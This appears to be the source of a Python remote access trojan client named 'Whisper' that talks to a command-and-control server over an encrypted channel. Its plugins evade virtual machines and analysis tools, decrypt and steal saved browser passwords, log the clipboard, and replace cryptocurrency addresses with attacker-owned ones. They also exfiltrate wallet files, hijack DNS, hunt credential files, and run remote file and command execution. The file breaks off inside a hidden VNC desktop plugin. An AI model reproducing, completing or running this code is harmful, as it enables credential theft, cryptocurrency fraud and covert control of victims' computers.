import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform

C2_HOST = '127.0.0.1'
C2_PORT = 4447
ENCRYPTION_PASSWORD = 'whisper_secret_key'
RECONNECT_DELAY = 1

def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
def _eb(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
def _db(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))
def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
def rms(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return dec(d)
def sms(s, d):
    p = enc(d); s.sendall(len(p).to_bytes(4, "big") + p)

_CMDS = {}

# --- anti_vm plugin ---

import ctypes

def _vm_check_registry():
    import winreg
    flags = []
    checks = [
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__", "VirtualBox ACPI"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\VBOX__", "VirtualBox FADT"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\VBOX__", "VirtualBox RSDT"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", "VBox GA"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters", "Hyper-V"),
        (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "VMware"),
    ]
    for hive, key, name in checks:
        try:
            with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                winreg.QueryValueEx(k, "")
                flags.append(name)
        except: pass
    # Check for VMware specific identifiers in SCSI
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "Identifier")
            if "VMware" in str(val): flags.append("VMware_SCSI")
    except: pass
    return flags

def _vm_check_processes():
    names = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
             "xenservice.exe", "xensrvc.exe", "qemu-ga.exe", "procmon.exe", "procmon64.exe",
             "wireshark.exe", "dumpcap.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
             "ida.exe", "idag.exe", "ida64.exe", "immunitydbg.exe", "windbg.exe",
             "devenv.exe", "taskmgr.exe", "httpdebuggerui.exe", "fiddler.exe", "regmon.exe",
             "filemon.exe", "tcpview.exe", "autoruns.exe", "processhacker.exe",
             "pestudio.exe", "resourcehacker.exe", "vmtoolsd.exe", "vboxservice.exe"]
    found = []
    if platform.system() == "Windows":
        try:
            out = subprocess.check_output("tasklist", creationflags=0x08000000).decode(errors="ignore").lower()
            for n in names:
                if n.lower() in out: found.append(n)
        except: pass
    else:
        try:
            out = subprocess.check_output(["ps", "aux"], timeout=10).decode(errors="ignore").lower()
            for n in names:
                if n.lower() in out: found.append(n)
        except: pass
    return found

def _vm_check_system():
    checks = []
    # CPU count
    try:
        if platform.system() == "Windows":
            import ctypes
            kernel32 = ctypes.windll.kernel32
            cpu_count = kernel32.GetSystemInfo().dwNumberOfProcessors if hasattr(kernel32, "GetSystemInfo") else 0
            # simplified: use os.cpu_count
        cpu = os.cpu_count() or 0
        if cpu <= 2: checks.append(f"Low CPU cores ({cpu})")
    except: pass
    # RAM size
    try:
        if platform.system() == "Windows":
            kernel32 = ctypes.windll.kernel32
            mem = ctypes.c_ulonglong()
            kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
            ram_mb = mem.value // 1024
            if ram_mb < 2048: checks.append(f"Low RAM ({ram_mb} MB)")
    except: pass
    # Disk size
    try:
        import shutil
        for d in ("C:\\", "/"):
            try:
                du = shutil.disk_usage(d)
                if du.total < 60 * 1024**3:
                    checks.append(f"Small disk ({d}: {du.total//1024**3} GB)")
                    break
            except: pass
    except: pass
    return checks

def _vm_check_mac():
    try:
        import uuid
        mac = uuid.getnode()
        prefixes = ["080027", "000569", "001C42", "000C29", "005056", "001C14", "000F4B"]
        mac_str = format(mac, "012x")
        for p in prefixes:
            if mac_str.startswith(p.lower()):
                return [f"VM MAC prefix: {p}"]
    except: pass
    return []

def _cmd_check_vm(m):
    try:
        results = {}
        results["registry"] = _vm_check_registry()
        results["processes"] = _vm_check_processes()
        results["system"] = _vm_check_system()
        results["mac"] = _vm_check_mac()
        all_flags = [item for sublist in results.values() for item in sublist]
        output = "[+] VM Detection Results:\n"
        if all_flags:
            output += f"  [!] VM indicators found ({len(all_flags)}):\n"
            for cat, items in results.items():
                if items:
                    output += f"    [{cat}] {', '.join(items)}\n"
        else:
            output += "  [OK] No VM indicators detected\n"
        return {"output": output, "vm_detected": len(all_flags) > 0}
    except Exception as e: return {"output": f"[!] VM check error: {e}"}
_CMDS["check_vm"] = _cmd_check_vm


# --- browser_harvest plugin ---

def _aes_gcm_decrypt(key, data, aad=None):
    if isinstance(data, bytes) and data[:3] == b"v10": data = data[3:]
    nonce, ct, tag = data[:12], data[12:-16], data[-16:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct + tag, aad)
    except ImportError:
        try:
            from Crypto.Cipher import AES
            c = AES.new(key, AES.MODE_GCM, nonce=nonce)
            if aad: c.update(aad)
            return c.decrypt_and_verify(ct, tag)
        except ImportError:
            try:
                import subprocess, sys
                subprocess.run([sys.executable, "-m", "pip", "install", "cryptography", "-q"], timeout=30)
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                return AESGCM(key).decrypt(nonce, ct + tag, aad)
            except: return None

def _decrypt_key(ek):
    try:
        import ctypes; from ctypes import wintypes
        class B(ctypes.Structure): _fields_ = [("s", wintypes.DWORD), ("d", ctypes.POINTER(ctypes.c_byte))]
        kb = base64.b64decode(ek)
        if kb[:5] == b"DPAPI": kb = kb[5:]
        bi = B(len(kb), ctypes.cast(kb, ctypes.POINTER(ctypes.c_byte))); bo = B()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.d, bo.s); ctypes.windll.kernel32.LocalFree(bo.d); return r
    except: return None

def _ff_key(profile):
    k4 = os.path.join(profile, "key4.db")
    lf = os.path.join(profile, "logins.json")
    if not os.path.isfile(k4) or not os.path.isfile(lf): return None
    try:
        import sqlite3, hashlib
        conn = sqlite3.connect(k4)
        gs = conn.execute("SELECT item1 FROM metadata WHERE id=1").fetchone()
        if not gs: conn.close(); return None
        gs = gs[0]
        row = conn.execute("SELECT a11, a102 FROM nssPrivate WHERE id=1").fetchone()
        conn.close()
        if not row: return None
        a11, a102 = row
        if not a11 or not a102: return None
        hp = hashlib.sha1(gs + b"\x00").digest()[:20]
        chp = hashlib.sha1(hp).digest()[:20]
        k1 = hashlib.sha1(chp + gs).digest()[:20]
        tk = hashlib.sha1(gs + chp).digest()[:20]
        k2 = hashlib.sha1(tk + chp).digest()[:20]
        wk = k1[:16]
        import struct
        d = a11
        if d[0] == 0x30:
            o = 2 + (d[1] & 0x7f) if d[1] & 0x80 else 2
            if d[o] == 0x04:
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
            while o < len(d) and d[o] != 0x04:
                o += 1
            if o < len(d):
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
                d = d[o:]
        mk = _aes_gcm_decrypt(wk, d, a102)
        if mk is None:
            wk = (k1 + k2)[:24]
            mk = _aes_gcm_decrypt(wk, d, a102)
        return mk
    except: return None

def _ff_decrypt(mk, val):
    if not mk or not val: return ""
    try:
        d = base64.b64decode(val)
        r = _aes_gcm_decrypt(mk, d)
        if r: return r.decode(errors="replace")
    except: pass
    return "[encrypted]"

def _harvest_chrome(path):
    try:
        import sqlite3, shutil, tempfile
        ls = os.path.join(path, "Local State")
        if not os.path.isfile(ls): return []
        with open(ls) as f: state = json.load(f)
        ek = state.get("os_crypt", {}).get("encrypted_key", "")
        if not ek: return []
        mk = _decrypt_key(ek)
        if not mk: return []
        creds = []
        for entry in os.listdir(path):
            db = os.path.join(path, entry, "Login Data")
            if not os.path.isfile(db): continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db, tmp)
                for row in sqlite3.connect(tmp).execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if not row[2]: continue
                    p = _aes_gcm_decrypt(mk, row[2])
                    if p:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": p.decode(errors="replace")})
                    else:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": "[encrypted]"})
            except: pass
            finally:
                try: os.remove(tmp)
                except: pass
        return creds
    except: return []

def _cmd_harvest(m):
    r = {"passwords": [], "cookies": []}
    if platform.system() == "Windows":
        local = os.environ.get("LOCALAPPDATA", "")
        for b, p in [("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
                     ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data"))]:
            if os.path.isdir(p):
                mk = None
                for c in _harvest_chrome(p):
                    c["browser"] = b; r["passwords"].append(c)
    base = {"Windows": os.environ.get("APPDATA", ""), "Linux": os.path.expanduser("~/.mozilla/firefox"),
            "Darwin": os.path.expanduser("~/Library/Application Support/Firefox/Profiles")}.get(platform.system(), "")
    if os.path.isdir(base):
        for prof in sorted(os.listdir(base)):
            fp = os.path.join(base, prof)
            lf = os.path.join(fp, "logins.json")
            if not os.path.isfile(lf): continue
            mk = _ff_key(fp)
            if not mk: continue
            try:
                with open(lf) as f: data = json.load(f)
                for item in data.get("logins", []):
                    r["passwords"].append({"browser": "Firefox", "url": item.get("hostname","")[:120], "user": _ff_decrypt(mk, item.get("encryptedUsername","")), "pass": _ff_decrypt(mk, item.get("encryptedPassword",""))})
            except: pass
    r["total"] = len(r["passwords"])
    return {"data": r}
_CMDS["harvest"] = _cmd_harvest


# --- clipboard plugin ---

_CREATE_NO_WINDOW = 0x08000000

def _get_clipboard_text():
    try:
        out = subprocess.check_output(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace").strip("\r\n ") or None
    except: return None

def _set_clipboard_text(text):
    try:
        safe = text.replace('"', '`"')
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{safe}"'],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
    except: pass

def _cmd_clipboard_get(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = _get_clipboard_text()
        if text:
            return {"data": text[:2000]}
        return {"output": "[!] No text on clipboard"}
    except Exception as e: return {"output": f"[!] Clipboard error: {e}"}

_clip_monitor_run = [False]
_clip_log = []

def _clip_monitor_thread():
    last = None
    while _clip_monitor_run[0]:
        try:
            text = _get_clipboard_text()
            if text and text != last:
                last = text
                _clip_log.append(text[:500])
        except: pass
        time.sleep(1)

def _cmd_clipboard_monitor(m):
    try:
        action = m.get("action", "start")
        if action == "start":
            if _clip_monitor_run[0]: return {"output": "[!] Clipboard monitor already running"}
            _clip_monitor_run[0] = True
            _clip_log.clear()
            threading.Thread(target=_clip_monitor_thread, daemon=True).start()
            return {"output": "[+] Clipboard monitor started"}
        elif action == "stop":
            _clip_monitor_run[0] = False
            return {"output": "[+] Clipboard monitor stopped"}
        elif action == "dump":
            logs = list(_clip_log)
            _clip_log.clear()
            return {"output": "\n".join(logs[-20:]) if logs else "[!] No clipboard captures"}
        return {"output": "[!] Use action=start/stop/dump"}
    except Exception as e: return {"output": f"[!] Clipboard monitor error: {e}"}

def _cmd_clipboard_set(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Clipboard requires Windows"}
        text = m.get("text", "")
        _set_clipboard_text(text)
        return {"output": f"[+] Clipboard set to: {text[:100]}"}
    except Exception as e: return {"output": f"[!] Clipboard set error: {e}"}

_CMDS["clipboard_get"] = _cmd_clipboard_get
_CMDS["clipboard_monitor"] = _cmd_clipboard_monitor
_CMDS["clipboard_set"] = _cmd_clipboard_set


# --- crypto_clipper plugin ---

import re, hashlib

_CREATE_NO_WINDOW = 0x08000000

_REPLACEMENTS = {
    "btc": r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
    "eth": r"\b0x[a-fA-F0-9]{40}\b",
    "ltc": r"\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\b",
    "xmr": r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b",
    "dash": r"\bX[1-9A-HJ-NP-Za-km-z]{33}\b",
}

_REPLACE_ADDRS = {
    "btc": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "eth": "0x742d35Cc6634C0532925a3b844Bc454e4438f44",
    "ltc": "LVg2k9fVxSfKJjPqMD9P8kE7GpX9yGZR9j",
    "xmr": "4AdUndXHZ6B1hUv7RJE3qVx9Q3oXj8Y8K3GPqL5qkGzQYx6HkL9F8xW5Q4nPc2vR7mWXa3sZ9jK8nM2bV1cR4tY7uP",
    "dash": "Xx4Q8g7Jf3Kp9Lm2Nv5Rw8Yb1Cs4Dg6Hj",
}

_clipper_run = [False]

def _clip_get():
    try:
        out = subprocess.check_output(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
        return out.decode("utf-8", errors="replace").strip("\r\n ") or None
    except: return None

def _clip_set(text):
    try:
        safe = text.replace('"', '`"')
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{safe}"'],
            timeout=10, creationflags=_CREATE_NO_WINDOW, stderr=subprocess.DEVNULL)
    except: pass

def _replace_addresses(text, overrides=None):
    replaced = text
    found = []
    for coin, pattern in _REPLACEMENTS.items():
        rep = _REPLACE_ADDRS[coin]
        if overrides and coin in overrides: rep = overrides[coin]
        for match in re.finditer(pattern, replaced):
            addr = match.group()
            if addr != rep:
                found.append({"coin": coin, "original": addr, "replacement": rep})
                replaced = replaced.replace(addr, rep, 1)
    return replaced, found

def _clipper_thread(overrides):
    while _clipper_run[0]:
        try:
            text = _clip_get()
            if text:
                new_text, found = _replace_addresses(text, overrides)
                if found and new_text != text:
                    _clip_set(new_text)
        except: pass
        time.sleep(0.5)

def _cmd_clipper_start(m):
    try:
        if _clipper_run[0]: return {"output": "[!] Clipper already running"}
        _clipper_run[0] = True
        overrides = {}
        for coin in _REPLACEMENTS:
            if coin in m: overrides[coin] = m[coin]
        threading.Thread(target=_clipper_thread, args=(overrides,), daemon=True).start()
        return {"output": "[+] Crypto clipper started - monitoring clipboard"}
    except Exception as e: return {"output": f"[!] Clipper error: {e}"}

def _cmd_clipper_stop(m):
    _clipper_run[0] = False; return {"output": "[+] Crypto clipper stopped"}

def _cmd_clipper_test(m):
    try:
        text = m.get("text", "Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        new_text, found = _replace_addresses(text)
        out = f"[+] Test: {len(found)} addresses would be replaced\n"
        for f in found:
            out += f"  [{f['coin']}] {f['original']} -> {f['replacement']}\n"
        return {"output": out}
    except Exception as e: return {"output": f"[!] Clipper test error: {e}"}

_CMDS["clipper_start"] = _cmd_clipper_start
_CMDS["clipper_stop"] = _cmd_clipper_stop
_CMDS["clipper_test"] = _cmd_clipper_test


# --- crypto_steal plugin ---

import os, base64, json

# Common wallet file patterns and locations
_WALLET_PATHS = {
    "Bitcoin": [r"AppData\Roaming\Bitcoin\wallet.dat", r"AppData\Roaming\Bitcoin\wallets"],
    "Ethereum": [r"AppData\Roaming\Ethereum\keystore", r"AppData\Roaming\Ethereum\wallets"],
    "Monero": [r"AppData\Roaming\monero\wallet", r"AppData\Roaming\monero\wallets"],
    "Litecoin": [r"AppData\Roaming\Litecoin\wallet.dat"],
    "Dogecoin": [r"AppData\Roaming\Dogecoin\wallet.dat"],
    "Dash": [r"AppData\Roaming\DashCore\wallet.dat"],
    "Zcash": [r"AppData\Roaming\Zcash\wallet.dat"],
    "Cardano": [r"AppData\Roaming\Daedalus\wallets"],
    "Electrum": [r"AppData\Roaming\Electrum\wallets"],
    "Exodus": [r"AppData\Roaming\Exodus\exodus.wallet"],
    "Atomic": [r"AppData\Roaming\atomic\Local Storage\leveldb"],
    "Jaxx": [r"AppData\Roaming\jaxx\Local Storage\leveldb"],
    "MetaMask": [r"AppData\Roaming\Mozilla\Firefox\Profiles", r"AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    "Binance": [r"AppData\Roaming\Binance\wallets"],
}

def _find_wallets():
    found = []
    home = os.path.expanduser("~")
    for name, paths in _WALLET_PATHS.items():
        for p in paths:
            full = os.path.join(home, p)
            if os.path.isfile(full):
                try:
                    with open(full, "rb") as f: data = f.read(1024*1024)
                    found.append({"wallet": name, "path": full, "size": len(data), "data_b64": base64.b64encode(data).decode()})
                except: pass
            elif os.path.isdir(full):
                try:
                    for root, dirs, files in os.walk(full):
                        for fname in files:
                            fpath = os.path.join(root, fname)
                            try:
                                with open(fpath, "rb") as f: data = f.read(512*1024)
                                found.append({"wallet": name, "path": fpath, "size": len(data),
                                              "data_b64": base64.b64encode(data).decode() if len(data) < 100*1024 else ""})
                            except: pass
                            if len(found) > 20: break
                        if len(found) > 20: break
                except: pass
    return found

def _find_browser_extensions():
    found = []
    home = os.path.expanduser("~")
    # Chrome extensions
    chrome_ext = os.path.join(home, r"AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings")
    wallet_exts = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
        "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask Beta",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
        "aholpfdialjgjfhomihkjbmgjidlcdno": "Keplr",
        "dmkamcknogkgcdfhhbddcghachkejeap": "Exodus",
        "cmedhionkhpnakcndndgjdbohmhepckk": "TronLink",
        "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Coinbase Wallet",
        "fhbohimaelbohpjbbldcngcnapndodjp": "Binance Chain Wallet",
    }
    if os.path.isdir(chrome_ext):
        for ext_id, name in wallet_exts.items():
            ext_dir = os.path.join(chrome_ext, ext_id)
            if os.path.isdir(ext_dir):
                for root, dirs, files in os.walk(ext_dir):
                    for f in files:
                        if f.endswith(".log"):
                            fpath = os.path.join(root, f)
                            try:
                                with open(fpath, "rb") as fh: data = fh.read(500*1024)
                                found.append({"wallet": f"{name}_ext", "path": fpath, "size": len(data)})
                            except: pass
    return found

def _cmd_crypto_steal(m):
    try:
        wallets = _find_wallets()
        ext_data = _find_browser_extensions()
        all_items = wallets + ext_data
        if not all_items:
            return {"output": "[!] No wallet files found"}
        summary = {}
        for item in all_items:
            name = item["wallet"]
            if name not in summary: summary[name] = 0
            summary[name] += 1
        lines = [f"[+] Found {len(all_items)} wallet items:"]
        for name, count in sorted(summary.items()):
            lines.append(f"  {name}: {count} file(s)")
        data_items = [i for i in all_items if i.get("data_b64")]
        return {"output": "\n".join(lines), "wallets": all_items[:30]}
    except Exception as e: return {"output": f"[!] Crypto steal error: {e}"}
_CMDS["crypto_steal"] = _cmd_crypto_steal


# --- dns_hijack plugin ---

import subprocess, os, platform

def _get_dns_windows():
    try:
        out = subprocess.check_output(["netsh", "interface", "ip", "show", "dns"], timeout=15, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
        lines = [l.strip() for l in out.split("\n") if "DNS" in l and ":" in l]
        return lines if lines else ["No DNS servers found"]
    except: return ["netsh failed"]

def _set_dns_windows(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        out = subprocess.check_output(["netsh", "interface", "show", "interface"], timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode()
        interfaces = []
        for line in out.split("\n"):
            parts = line.strip().split()
            if len(parts) >= 4 and "Connected" in line:
                name = " ".join(parts[3:])
                interfaces.append(name)
        results = []
        for iface in interfaces:
            try:
                r1 = subprocess.run(["netsh", "interface", "ip", "set", "dns", f'name={iface}', "static", primary], capture_output=True, timeout=10, creationflags=0x08000000)
                results.append(f"Set DNS on {iface}: {r1.returncode}")
                if secondary:
                    r2 = subprocess.run(["netsh", "interface", "ip", "add", "dns", f'name={iface}', secondary, "index=2"], capture_output=True, timeout=10, creationflags=0x08000000)
            except Exception as e:
                results.append(f"Failed {iface}: {e}")
        return results
    except Exception as e: return [str(e)]

def _set_dns_linux(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        with open("/etc/resolv.conf", "w") as f:
            f.write(f"nameserver {primary}\nnameserver {secondary}\n")
        return ["DNS servers updated in /etc/resolv.conf"]
    except Exception as e: return [str(e)]

def _set_dns_macos(primary="8.8.8.8", secondary="8.8.4.4"):
    try:
        services = subprocess.check_output(["networksetup", "-listallnetworkservices"], timeout=10).decode().split("\n")
        results = []
        for svc in services:
            svc = svc.strip()
            if svc and not svc.startswith("*") and svc != "An asterisk":
                try:
                    subprocess.run(["networksetup", "-setdnsservers", svc, primary, secondary], capture_output=True, timeout=10)
                    results.append(f"Set DNS on {svc}")
                except: pass
        return results
    except Exception as e: [str(e)]

def _cmd_dns_get(m):
    try:
        if platform.system() == "Windows":
            dns_info = _get_dns_windows()
        elif platform.system() == "Linux":
            try:
                with open("/etc/resolv.conf") as f: dns_info = [l.strip() for l in f if l.startswith("nameserver")]
            except: dns_info = ["Cannot read /etc/resolv.conf"]
        elif platform.system() == "Darwin":
            dns_info = ["Run: networksetup -getdnsservers <service>"]
        else: dns_info = ["Unsupported OS"]
        return {"output": "\n".join(["[+] Current DNS:"] + ["  " + l for l in dns_info])}
    except Exception as e: return {"output": f"[!] DNS get error: {e}"}

def _cmd_dns_set(m):
    try:
        primary = m.get("primary", "8.8.8.8")
        secondary = m.get("secondary", "8.8.4.4")
        if platform.system() == "Windows":
            r = _set_dns_windows(primary, secondary)
        elif platform.system() == "Linux":
            r = _set_dns_linux(primary, secondary)
        elif platform.system() == "Darwin":
            r = _set_dns_macos(primary, secondary)
        else:
            r = ["Unsupported OS"]
        output = "[+] DNS Update Results:\n" + "\n".join("  " + l for l in r)
        return {"output": output}
    except Exception as e: return {"output": f"[!] DNS set error: {e}"}

def _cmd_dns_restore(m):
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(["netsh", "interface", "ip", "set", "dns"], timeout=15, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
            return {"output": "[+] DNS settings reset to DHCP"}
        elif platform.system() == "Linux":
            return {"output": "[!] Manual restore of /etc/resolv.conf required"}
        return {"output": "[!] Unsupported OS"}
    except Exception as e: return {"output": f"[!] DNS restore error: {e}"}

_CMDS["dns_get"] = _cmd_dns_get
_CMDS["dns_set"] = _cmd_dns_set
_CMDS["dns_restore"] = _cmd_dns_restore


# --- file_hunter plugin ---

import os, base64

_HUNT_TARGETS = {
    "documents": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".rtf", ".csv"],
    "credentials": [".kdbx", ".kdb", ".key", ".pem", ".ppk", ".id_rsa", ".pgp", ".gpg", ".ovpn"],
    "configs": [".env", ".config", ".conf", ".ini", ".cfg", ".yml", ".yaml", ".xml", ".json"],
    "code": [".py", ".js", ".ts", ".java", ".php", ".rb", ".go", ".rs", ".c", ".cpp", ".cs"],
    "images": [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".raw", ".psd"],
    "archives": [".zip", ".rar", ".7z", ".tar", ".gz", ".bz2"],
}

def _hunt_files(root_dir, extensions, max_results=50, max_depth=4):
    found = []
    root_dir = os.path.abspath(root_dir)
    try:
        for item in os.listdir(root_dir):
            if len(found) >= max_results: break
            item_path = os.path.join(root_dir, item)
            try:
                if os.path.isfile(item_path):
                    ext = os.path.splitext(item)[1].lower()
                    if ext in extensions:
                        sz = os.path.getsize(item_path)
                        found.append({"path": item_path, "size": sz, "ext": ext})
                elif os.path.isdir(item_path) and max_depth > 0:
                    try:
                        found.extend(_hunt_files(item_path, extensions, max_results - len(found), max_depth - 1))
                    except: pass
            except: pass
    except: pass
    return found

def _cmd_file_hunt(m):
    try:
        root = m.get("path", os.path.expanduser("~"))
        ext = m.get("ext", "")
        cat = m.get("category", "")
        max_results = min(m.get("max", 50), 200)
        max_depth = min(m.get("depth", 3), 6)

        extensions = set()
        if ext:
            for e in ext.split(","):
                e = e.strip().lower()
                if not e.startswith("."): e = "." + e
                extensions.add(e)
        if cat and cat in _HUNT_TARGETS:
            extensions.update(_HUNT_TARGETS[cat])
        if not extensions:
            extensions = set([".pdf", ".doc", ".docx", ".xls", ".xlsx"])
        extensions = list(extensions)

        results = _hunt_files(root, extensions, max_results, max_depth)
        if not results:
            return {"output": f"[!] No files found matching {extensions[:5]} in {root}"}

        results.sort(key=lambda x: -x["size"])
        lines = [f"[+] Found {len(results)} files:"]
        for r in results[:30]:
            lines.append(f"  {r['ext']:8s} {r['size']:>10,} B  {r['path'][:120]}")
        if len(results) > 30:
            lines.append(f"  ... and {len(results)-30} more")
        return {"output": "\n".join(lines), "files": results}
    except Exception as e: return {"output": f"[!] File hunt error: {e}"}

_CMDS["file_hunt"] = _cmd_file_hunt


# --- file_manager plugin ---

def _cmd_ls(m):
    try:
        items = []
        for e in os.scandir(m.get("path", ".")):
            try:
                st = e.stat()
                items.append({"name": e.name, "type": "dir" if e.is_dir() else "file",
                              "size": st.st_size if e.is_file() else 0,
                              "mtime": st.st_mtime if hasattr(st, "st_mtime") else 0})
            except: pass
        return {"path": os.path.abspath(m.get("path", ".")), "items": items}
    except Exception as e: return {"error": str(e)}

def _cmd_upload(m):
    try:
        os.makedirs(os.path.dirname(m["path"]), exist_ok=True)
        with open(m["path"], "wb") as f: f.write(base64.b64decode(m["data"]))
        return {"output": f"[+] Uploaded to {m['path']}"}
    except Exception as e: return {"output": f"[!] Upload failed: {e}"}

def _cmd_download(m):
    try:
        with open(m["path"], "rb") as f: return {"data": base64.b64encode(f.read()).decode()}
    except Exception as e: return {"error": str(e)}

def _cmd_delete(m):
    try:
        p = m["path"]
        if os.path.isdir(p):
            import shutil
            shutil.rmtree(p)
        else:
            os.remove(p)
        return {"output": f"[+] Deleted: {p}"}
    except Exception as e: return {"output": f"[!] Delete failed: {e}"}

def _cmd_execute(m):
    try:
        p = m["path"]
        args = m.get("args", "")
        wait = m.get("wait", False)
        cmd = f'"{p}" {args}'.strip()
        if wait:
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=int(m.get("timeout", 30)))
            out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
            return {"output": out[:5000] if out else f"[+] Executed (exit={r.returncode})"}
        else:
            subprocess.Popen(cmd, shell=True, close_fds=True)
            return {"output": f"[+] Started: {p}"}
    except subprocess.TimeoutExpired: return {"output": "[!] Execution timed out"}
    except Exception as e: return {"output": f"[!] Execute failed: {e}"}

def _cmd_search(m):
    try:
        root = m.get("path", ".")
        pattern = m.get("pattern", "*")
        max_results = min(m.get("max", 50), 200)
        results = []
        try:
            import fnmatch
            count = 0
            for r, dirs, files in os.walk(root):
                for f in files:
                    if fnmatch.fnmatch(f, pattern):
                        fp = os.path.join(r, f)
                        try:
                            sz = os.path.getsize(fp)
                            results.append({"path": fp, "size": sz})
                            count += 1
                            if count >= max_results: break
                        except: pass
                if count >= max_results: break
        except: pass
        if not results: return {"output": f"[!] No files matching '{pattern}' in {root}"}
        lines = [f"[+] Found {len(results)} files:"]
        for r in results[:30]:
            lines.append(f"  {r['size']:>10,} B  {r['path'][:120]}")
        if len(results) > 30: lines.append(f"  ... and {len(results)-30} more")
        return {"output": "\n".join(lines), "files": results}
    except Exception as e: return {"output": f"[!] Search error: {e}"}

_CMDS["ls"] = _cmd_ls
_CMDS["upload"] = _cmd_upload
_CMDS["download"] = _cmd_download
_CMDS["delete"] = _cmd_delete
_CMDS["execute"] = _cmd_execute
_CMDS["search"] = _cmd_search


# --- hvnc plugin ---

_hvnc_name = "Whisper_HVNC_" + str(os.getpid())
_hvnc_desk = None
_hvnc_run = [False]

def _hvnc_thread():
    global _hvnc_desk
    import ctypes
    u32 = ctypes.windll.user32
    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, 0x1000, None)
    if not desk:
        _hvnc_desk = None; _hvnc_run[0] = False; return
    _hvnc_desk = desk; _hvnc_run[0] = True
    try:
        si = subprocess.STARTUPINFO()
        si.lpDesktop = _hvnc_name
        subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
        while _hvnc_run[0] and desk:
            time.sleep(2)
    finally:
